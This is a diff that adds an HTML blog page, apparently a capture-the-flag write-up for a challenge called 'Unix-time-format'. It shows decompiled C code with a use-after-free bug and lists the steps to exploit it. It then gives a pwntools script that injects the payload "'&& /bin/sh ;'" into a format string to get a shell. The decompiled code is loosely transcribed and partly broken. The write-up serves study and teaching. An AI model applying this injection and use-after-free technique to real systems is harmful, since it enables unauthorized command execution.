@@ -1,0 +1,136 @@
+<html>
+ <head>
+<title> Blog </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:1.7em;line-height:1.3"> Time pls!</p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Unix-time-format </h1>
+   
+ <br> 
+
+<p> Ok this one was pretty simple  it contained uaf bug . <br> 
+    The vuln code snippet ... </p>
+
+<code>
+void set_foramt()
+{
+heap_ptr = strdup(str)
+qmemcpy(&accept, "%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# ", 0x33uLL);
+if (strspn(s, &accept) == strlen(s))
+  {
+    qword_602118 = heap_ptr;
+  }
+}
+...
+void set_zone()
+{
+ heap_ptr = strdup(str)
+ 
+}
+void quit()
+{
+  free(qword_602118)
+  free(qword_602120)
+  if( gets(s) == "Y")
+   {
+      exit(0)
+   }
+}
+
+void print()
+{
+   snprintf(&command, 2048LL, 1LL, 2048LL, "/bin/date -d @%d +'%s'", dword_602120);  <------- ptr used after free :)
+   system(&command)
+}
+</code>
+
+<br><br>
+
+<p> So to exploit it <br>
+    <b> 1) call set_format which malloc's our input and copies str with 'DUMMY' </b> <br>
+    <b> 2) now free the memory using quit and giving 'N' to avoid exiting </b> <br>
+    <b> 3) now use set_zone to allocate in our payload in same mem as format str  </b> <br>
+    <b> 4) now call print to exeute command and we use shell escape and get the shell :) </p>
+
+<code>
+from pwn import *
+p = process("unix")
+log.info(p.recvuntil('>'))
+p.sendline("1")
+log.info(p.recvuntil(':'))
+p.sendline("AAAA")
+log.info(p.recvuntil('>'))
+p.sendline("5")
+log.info(p.recvuntil('?'))
+p.sendline("N")
+log.info(p.recvuntil('>'))
+p.sendline("3")
+log.info(p.recvuntil(':'))
+payload = "'&& /bin/sh ;'"
+p.sendline(payload)
+log.info(p.recvuntil('>'))
+p.sendline("4")
+p.interactive()
+</code>
+
+</body>
+</html>
